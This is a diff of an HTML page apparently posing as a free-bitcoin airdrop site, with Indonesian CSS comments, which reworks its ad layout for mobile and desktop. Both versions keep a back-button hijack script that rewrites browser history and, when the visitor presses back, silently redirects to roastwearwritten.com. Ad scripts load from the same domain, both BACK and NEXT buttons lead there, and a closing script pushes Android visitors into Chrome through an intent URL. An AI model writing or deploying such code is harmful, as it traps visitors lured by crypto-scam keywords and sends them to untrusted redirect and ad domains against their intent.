@@ -8,64 +8,47 @@
     <meta name="keywords" content="bitcoin airdrop, btc airdrop, crypto airdrops, free bitcoin, latest airdrops, crypto portfolio, bitcoin wallet, passive crypto income, crypto investment, earn free crypto, BRC-20 airdrops, verified crypto airdrops, claim free crypto tokens">
     <script type="text/javascript">
     (function(window, location) {
-    history.replaceState(null, document.title, location.pathname+"#!/history");
-    history.pushState(null, document.title, location.pathname);
+        history.replaceState(null, document.title, location.pathname+"#!/history");
+        history.pushState(null, document.title, location.pathname);
     
-    window.addEventListener("popstate", function() {
-      if(location.hash === "#!/history") {
-        history.replaceState(null, document.title, location.pathname);
-        setTimeout(function(){
-          location.replace("https://roastwearwritten.com/bmu1rhf7?key=e3ff974fd2665b1074e29d32efa30da4");
-        },0);
-      }
-    }, false);
+        window.addEventListener("popstate", function() {
+          if(location.hash === "#!/history") {
+            history.replaceState(null, document.title, location.pathname);
+            setTimeout(function(){
+              location.replace("https://roastwearwritten.com/bmu1rhf7?key=e3ff974fd2665b1074e29d32efa30da4");
+            },0);
+          }
+        }, false);
     }(window, location));
     </script>
     <style>
-        /* PERUBAHAN: Latar belakang luar diubah menjadi abu-abu gelap */
+        /* Gaya dasar untuk body */
         body {
-            background-color: #333333; /* Abu-abu gelap */
+            background-color: #ffffff;
             font-family: sans-serif;
             margin: 0;
-            padding: 20px; /* Memberi sedikit ruang di sekitar container */
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
+            padding: 0;
             min-height: 100vh;
-            box-sizing: border-box; /* Memastikan padding tidak menyebabkan overflow */
         }
 
-        /* Kontainer utama dengan lebar 500px */
-        .container {
+        /* Kontainer untuk konten di desktop */
+        .desktop-container {
             max-width: 500px;
-            width: 100%;
+            margin: 20px auto; /* Posisi di tengah untuk desktop */
             padding: 20px;
             box-sizing: border-box;
             border: 1px solid #ddd;
             border-radius: 8px;
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            background-color: #ffffff; /* PERUBAHAN: Latar belakang konten dibuat putih */
-        }
-
-        /* Gaya untuk judul (opsional, jika Anda ingin menambahkannya) */
-        .title {
             text-align: center;
-            color: #333;
-            margin-bottom: 20px;
         }
         
-        /* Iklan agar lebih responsif */
-        .ad-container {
-            text-align: center; /* Memusatkan skrip iklan */
-            margin-bottom: 20px; /* Memberi jarak ke tombol */
-        }
-
-        /* Kontainer untuk tombol */
+        /* Kontainer untuk tombol (Flexbox) */
         .button-container {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            gap: 10px; /* Cara modern untuk memberi jarak antar flex item */
+            margin-top: 20px; /* Jarak dari iklan di versi desktop */
         }
             
         /* Gaya umum untuk tombol */
@@ -73,40 +56,92 @@
             text-decoration: none;
             color: white;
             background-color: #007bff;
-            padding: 12px 20px; /* Padding disesuaikan agar lebih seimbang */
+            padding: 10px 40px;
             border-radius: 5px;
             font-weight: bold;
             transition: background-color 0.3s ease;
             flex-grow: 1;
+            margin: 0 5px;
             text-align: center;
         }
             
-        /* Efek hover saat kursor di atas tombol */
         .btn:hover {
             background-color: #0056b3;
         }
+
+        /* Sembunyikan kontainer iklan mobile di desktop */
+        .mobile-ad-container {
+            display: none;
+        }
+
+        /* === MEDIA QUERY UNTUK TAMPILAN PONSEL === */
+        @media (max-width: 600px) {
+            /* Sembunyikan tampilan desktop di mobile */
+            .desktop-container {
+                display: none;
+            }
+
+            /* Tampilkan dan atur kontainer iklan mobile */
+            .mobile-ad-container {
+                display: flex; /* Menggunakan flexbox untuk memusatkan iklan */
+                justify-content: center; /* Pusatkan secara horizontal */
+                align-items: flex-start; /* Pusatkan secara vertikal */
+                position: absolute;
+                top: 10%; /* Posisi 10% dari atas layar */
+                left: 0;
+                width: 100%;
+                height: 80%; /* Beri ruang agar tidak menutupi tombol */
+                box-sizing: border-box;
+                padding-top: 20px;
+            }
+
+            /* Atur ulang posisi tombol navigasi di mobile */
+            .button-container {
+                position: fixed; /* Tetap di posisi yang sama saat di-scroll */
+                bottom: 0; /* Di bagian bawah layar */
+                left: 0;
+                width: 100%;
+                background-color: #ffffff; /* Latar belakang agar tidak transparan */
+                padding: 15px 10px;
+                box-sizing: border-box;
+                box-shadow: 0 -2px 5px rgba(0,0,0,0.1); /* Bayangan di atas tombol */
+                margin-top: 0; /* Hapus margin atas */
+            }
+        }
+
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="ad-container">
-            <script type="text/javascript">
-                atOptions = {
-                    'key' : 'a317173734fbcd8901b885b17a227f72',
-                    'format' : 'iframe',
-                    'height' : 250,
-                    'width' : 300,
-                    'params' : {}
-                };
-            </script>
-            <script type="text/javascript" src="//roastwearwritten.com/a317173734fbcd8901b885b17a227f72/invoke.js"></script>
-        </div>
-        
-        <div class="button-container">
-            <a href="https://roastwearwritten.com/bmu1rhf7?key=d03769d0209088982f9e98466ebdf604" class="btn">BACK</a>
-            <a href="https://roastwearwritten.com/gfjrphnd?key=3d809b5b823dd66e24a5edcb7e62343e" class="btn">NEXT</a>
-        </div>
+    <div class="mobile-ad-container">
+        <script type="text/javascript">
+            atOptions = {
+                'key' : 'a317173734fbcd8901b885b17a227f72',
+                'format' : 'iframe',
+                'height' : 250,
+                'width' : 300,
+                'params' : {}
+            };
+        </script>
+        <script type="text/javascript" src="//roastwearwritten.com/a317173734fbcd8901b885b17a227f72/invoke.js"></script>
+    </div>
+
+    <div class="desktop-container">
+        <script type="text/javascript">
+            atOptions = {
+                'key' : 'a317173734fbcd8901b885b17a227f72',
+                'format' : 'iframe',
+                'height' : 250,
+                'width' : 300,
+                'params' : {}
+            };
+        </script>
+        <script type="text/javascript" src="//roastwearwritten.com/a317173734fbcd8901b885b17a227f72/invoke.js"></script>
+    </div>
+
+    <div class="button-container">
+        <a href="https://roastwearwritten.com/bmu1rhf7?key=d03769d0209088982f9e98466ebdf604" class="btn">BACK</a>
+        <a href="https://roastwearwritten.com/gfjrphnd?key=3d809b5b823dd66e24a5edcb7e62343e" class="btn">NEXT</a>
     </div>
 
     <script>
@@ -118,6 +153,7 @@
                 setTimeout(function() {
                     const currentUrl = window.location.href;
                     const intentUrl = "intent://" + currentUrl.replace(/https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
+                    
                     try {
                         if (/android/i.test(userAgent)) {
                            window.location.href = intentUrl;
